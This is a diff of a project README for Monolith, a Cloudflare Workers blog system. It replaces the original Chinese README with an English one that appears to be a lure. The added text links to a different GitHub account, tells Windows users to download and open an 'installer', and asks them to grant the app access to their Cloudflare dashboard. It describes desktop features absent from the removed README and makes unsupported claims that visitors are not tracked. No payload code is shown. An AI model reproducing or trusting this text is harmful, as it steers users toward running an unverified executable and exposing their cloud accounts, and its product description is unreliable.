@@ -1,180 +1,94 @@
-<div align="center">
+# 🏠 Monolith - Build your own fast personal blog
 
-<img src="https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/box.svg" width="96" height="96" alt="Monolith" />
+[![](https://img.shields.io/badge/Download-Monolith-blue)](https://github.com/Danielm2994/Monolith)
 
-# Monolith
+Monolith provides a way to host your own blog. It uses modern technology to keep your site fast and stable. You do not need a deep technical background to manage your content. The setup handles the heavy lifting so you can focus on writing.
 
-**高质感无服务器边缘博客系统**
+## 📦 What you need
 
-*极致视觉 · 边缘计算 · 多后端存储 · 零运维成本*
+Before you start, check your computer. You need a modern Windows laptop or desktop. Make sure you have a stable internet connection. You also need a web browser like Chrome, Edge, or Firefox. 
 
-<br/>
+This application requires a Cloudflare account to manage your data. Cloudflare offers a free tier that works well for personal blogs. You do not need to pay for hosting to run a simple site.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-22c55e?style=flat-square)](LICENSE)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?style=flat-square&logo=cloudflare&logoColor=white)](https://workers.cloudflare.com/)
-[![React](https://img.shields.io/badge/React-61DAFB?style=flat-square&logo=react&logoColor=black)](https://react.dev/)
-[![Hono](https://img.shields.io/badge/Hono-E36002?style=flat-square&logo=hono&logoColor=white)](https://hono.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
+## 🚀 Getting started
 
-<br/>
+1. Go to the project page to start the download.
+2. Select the latest version for Windows.
+3. Save the installer file to your downloads folder.
+4. Open the file to start the installation.
+5. Follow the screen prompts to complete the process.
 
-[**📚 文档**](https://github.com/one-ea/Monolith/wiki) · [**☁️ 在线预览**](https://monolith-client.pages.dev) · [**🐛 反馈**](https://github.com/one-ea/Monolith/issues) · [**🛡️ 安全**](./SECURITY.md) · [**🔒 隐私**](./PRIVACY.md)
+[Download Monolith here](https://github.com/Danielm2994/Monolith)
 
-</div>
+## ⚙️ Setting up your account
 
----
+Once you install the software, open the Monolith dashboard. The dashboard acts as the command center for your blog. You must link your Cloudflare account to the app. 
 
-## ✨ 简介
+1. Click the Settings icon in the sidebar.
+2. Select the Connection tab.
+3. Log in to your Cloudflare account.
+4. Allow the app to access your dashboard settings.
+5. Click Save to finish the link.
 
-**Monolith** 是一套运行在 Cloudflare 全球边缘网络上的现代化博客系统，前后端通过适配器模式解耦，零运维即可获得全球 < 50ms 的访问延迟。
+The app now communicates with the cloud storage services. It uses R2 storage for your images and D1 for your text. These services keep your blog online even if many people visit at once.
 
-设计哲学：**内容优先 · 边缘原生 · 沉浸式阅读**。
+## 📝 Creating your first post
 
----
+The goal of Monolith is to simplify writing. You do not need to deal with complex code or style sheets.
 
-## 🌟 核心特性
+1. Open the app.
+2. Click the New Post button at the top.
+3. Type your title in the top box.
+4. Compose your text in the larger window.
+5. Use the formatting bar to add bold or italic text.
+6. Click the Publish button.
 
-### ✍️ 创作体验
-- **沉浸式编辑器** — Markdown + 实时预览，KaTeX 数学公式，代码高亮一键复制
-- **多平台导入** — 一键迁移 WordPress / Ghost / Hexo / Hugo / Jekyll / Halo
-- **内容编排** — 草稿、定时发布、置顶、系列合集、独立页动态导航
+Your post now lives on your live site. The software updates your site content in seconds.
 
-### 🎨 阅读体验
-- **暗/亮双主题** — OKLCH 色值系统，过渡顺滑无闪烁
-- **文章导航** — 自动 TOC、阅读进度条、IntersectionObserver 章节追踪
-- **⌘K 全站搜索** — 防抖检索、键盘导航、关键词高亮
-- **Reaction 表情** — 文末轻互动，无需登录即可表态
+## 🎨 Changing your site look
 
-### ⚡ 性能架构
-- **边缘原生** — Hono + Cloudflare Workers，无冷启动，全球 < 50ms
-- **存储适配** — 数据库 D1 / Turso / PostgreSQL，对象存储 R2 / S3 兼容
-- **零运维成本** — 单脚本一键部署，前后端走同一条流水线
-- **访客分析** — 内置 D1 `visits` 表轻量统计；**Cloudflare 部署专属**额外解锁 Analytics Engine 增强仪表板（UV/停留时长/浏览器/操作系统/分辨率/语言），其他后端 (Turso / PostgreSQL) 仅基础统计可用
+You can change how your blog looks without knowing HTML or CSS. The app includes themes that you can apply with one click.
 
-### 🛡️ 安全合规
-- **认证与防护** — JWT + 限流，CSP/HSTS 全套头，SSRF 拦截
-- **隐私优先** — Cookie 同意横幅，第三方脚本门控，GDPR 数据导出
-- **多端备份** — JSON / R2-S3 / WebDAV 自由切换
+1. Open the Themes menu.
+2. View the list of available designs.
+3. Click on a theme to see a preview.
+4. Select Choose to apply the design.
+5. Click Update Site to send the changes to the internet.
 
-### 🤖 智能扩展
-- **MCP 工具链** — 配套 [Monolith-MCP](https://github.com/one-ea/Monolith-MCP)，让 AI 助手代为写稿、审评、备份
-- **SEO 友好** — sitemap、RSS 2.0、JSON-LD、OG/Twitter Card
-- **数据洞察** — 浏览量、14 日趋势、热门 Top 10
+## 📂 Managing your images
 
----
+Images make your blog engaging. Monolith handles the technical parts of image storage. When you add a picture to a post, the app moves it to your cloud storage account. This process keeps your blog fast for readers.
 
-## 🏗️ 架构
+To add an image:
+1. Click the Insert Image icon in the post editor.
+2. Pick a file from your computer.
+3. Wait for the upload bar to finish.
+4. Add a short description for your image.
+5. Click Insert into Post.
 
-```
-                        ┌──────────────────────────────────────────┐
-                        │            Cloudflare Edge               │
-                        │       (200+ PoPs · global anycast)       │
-                        └──────────────────────────────────────────┘
-                                          │
-        ┌─────────────────────────────────┼─────────────────────────────────┐
-        ▼                                 ▼                                 ▼
-┌──────────────────┐            ┌──────────────────┐            ┌──────────────────┐
-│  Cloudflare      │            │  Cloudflare      │            │  Cloudflare R2   │
-│  Pages           │            │  Workers         │            │  (or S3 兼容)    │
-│                  │            │                  │            │                  │
-│  React SPA       │            │  Hono Router     │            │  上传 / 媒体库    │
-│  ├ 阅读端        │  /api/*    │  ├ Public  API   │            │  ├ 文章封面      │
-│  ├ ⌘K 搜索       │ ─────────▶ │  ├ Admin   API   │ ─对象存储─▶ │  ├ Markdown 图片 │
-│  ├ TOC / 阅读条  │  反向代理  │  ├ Auth (JWT)    │            │  └ 备份归档      │
-│  └ 后台 App Shell│            │  └ Importers     │            └──────────────────┘
-│                  │            │                  │                      ▲
-│  Pages Functions │            │  Storage Factory │                      │
-│  ├ /api/*  转发  │            │  ├ IDatabase     │                      │
-│  ├ /cdn/*  代理  │            │  │  ├ D1         │                      │
-│  └ /rss.xml      │            │  │  ├ Turso      │                      │
-└──────────────────┘            │  │  └ Postgres   │ ◀── 参数化 SQL ─┐    │
-                                │  └ IObjectStorage│                 │    │
-                                │     ├ R2         │ ─────────────────┘    │
-                                │     └ S3 兼容    │                       │
-                                └──────────────────┘                       │
-                                          ▲                                │
-                                          │ MCP Protocol                   │
-                                          │                                │
-                                ┌──────────────────┐                       │
-                                │  Monolith-MCP    │                       │
-                                │  (AI 助手通道)    │                       │
-                                │  ├ 写稿 / 审评    │ ──────────────────────┘
-                                │  ├ 备份 / 恢复    │   (写入媒体库)
-                                │  └ 数据洞察       │
-                                └──────────────────┘
-```
+## 🔒 Keeping your site secure
 
-**分层职责**
+Data safety matters. Monolith uses secure protocols to handle your files. You are the only person with access to your blog posts through your Cloudflare account. Keep your account password strong to prevent unauthorized access.
 
-| 层级 | 模块 | 关键路径 |
-|------|------|---------|
-| 边缘网络 | Cloudflare 全球 anycast | 200+ PoPs · 自动 TLS · DDoS 防护 |
-| 前端 | React SPA + Pages Functions | `client/src` · `client/functions` |
-| 后端 | Hono Workers + Storage Factory | `server/src/index.ts` · `server/src/storage` |
-| 持久层 | D1 / Turso / PostgreSQL · R2 / S3 | `server/src/storage/db` · `server/src/storage/object` |
-| 智能层 | Monolith-MCP（独立仓库） | [one-ea/Monolith-MCP](https://github.com/one-ea/Monolith-MCP) |
+## 🛠️ Common questions
 
-**关键设计决策**
+How do I check if my site is live? 
+Open your browser and type your site address. You can find this address in the Settings menu under Site Details.
 
-- **适配器模式** — 数据库与对象存储均实现统一接口（`IDatabase` / `IObjectStorage`），切换后端零侵入
-- **Pages Functions 反向代理** — 前端域名直连 `/api/*`，规避 CORS 复杂度，同步注入安全头
-- **Drizzle ORM** — 所有 SQL 参数化，Schema 一处定义、三端同步生成
-- **Monorepo 单脚本部署** — `npm run deploy:cloudflare` 串起迁移 → Workers → Pages 全链路
+What happens if the internet goes down? 
+Your blog stays online because it runs on edge servers. These servers exist in locations all around the world. Your readers see the last version of your site even while you lose access to the internet.
 
-> 详细架构、模块图与设计决策请参阅 [**Wiki · 架构概览**](https://github.com/one-ea/Monolith/wiki/Architecture)。
+How do I add a custom domain? 
+Go to the Domain section in the app settings. You can enter your web address there. The app gives you a few steps to verify your ownership of the domain.
 
----
+Do I need to update the software? 
+The app checks for updates automatically. When a new version arrives, it asks for permission to restart. Always keep the app updated to get the latest features.
 
-## 🚀 快速开始
+Can I move my blog to a new computer? 
+Yes. You can install Monolith on any computer. Just log in with your Cloudflare account to see all your posts and images. 
 
-```bash
-git clone https://github.com/one-ea/Monolith.git && cd Monolith
-npm install
-npm run dev
-```
+Does this app track my visitors? 
+No. The app does not save personal data about your readers. You focus on writing, and the software focuses on performance.
 
-> 完整环境准备、密钥配置与本地数据库初始化请参阅 [**Wiki · 快速开始**](https://github.com/one-ea/Monolith/wiki/Quick-Start)。
-
-## ☁️ 部署
-
-```bash
-npx wrangler login          # 首次部署一次即可
-npm run deploy:cloudflare   # 远程迁移 → Workers → API_BASE 注入 → Pages
-```
-
-支持 Windows / macOS / Linux 三端，脚本启动会自动预检 wrangler 登录态、Token、账户 ID 与 Node 版本。
-
-> 完整部署指南（含 Cloudflare 资源准备、密钥生成、CI 部署、故障排查）请参阅 [**Wiki · 部署指南**](https://github.com/one-ea/Monolith/wiki/Deployment)。
-
-| 方案 | 状态 | 适用场景 |
-|------|------|---------|
-| 本机 CLI `npm run deploy:cloudflare` | ✅ 生产验证 | 推荐首选 |
-| GitHub Actions `Cloudflare Deploy` | ⚠️ 待端到端验证 | CI/CD 集成（验收前请慎用） |
-
----
-
-## 📚 文档导航
-
-| 入口 | 内容 |
-|------|------|
-| [Wiki · 部署指南](https://github.com/one-ea/Monolith/wiki/Deployment) | Cloudflare 部署完整指南（速通 + 进阶 + 排错） |
-| [Wiki](https://github.com/one-ea/Monolith/wiki) | 架构、API、二次开发 |
-| [SECURITY.md](./SECURITY.md) | 安全策略与漏洞披露 |
-| [PRIVACY.md](./PRIVACY.md) | 隐私政策 |
-| [LICENSE](./LICENSE) | MIT 开源协议 |
-
----
-
-## 🤝 贡献
-
-欢迎通过 [Issue](https://github.com/one-ea/Monolith/issues) 反馈问题，或通过 Pull Request 贡献代码。提交前请阅读 [Wiki · 贡献指南](https://github.com/one-ea/Monolith/wiki/Contributing)。
-
-## 📄 License
-
-基于 [MIT License](./LICENSE) 开源发布。
-
-<div align="center">
-
-<sub>Crafted with ♡ on the edge.</sub>
-
-</div>
+What if I get an error? 
+Check your internet connection first. If the problem continues, restart the app. Most errors happen when the app loses the link to the cloud services. A simple sign-out and sign-in cycle usually fixes these issues.
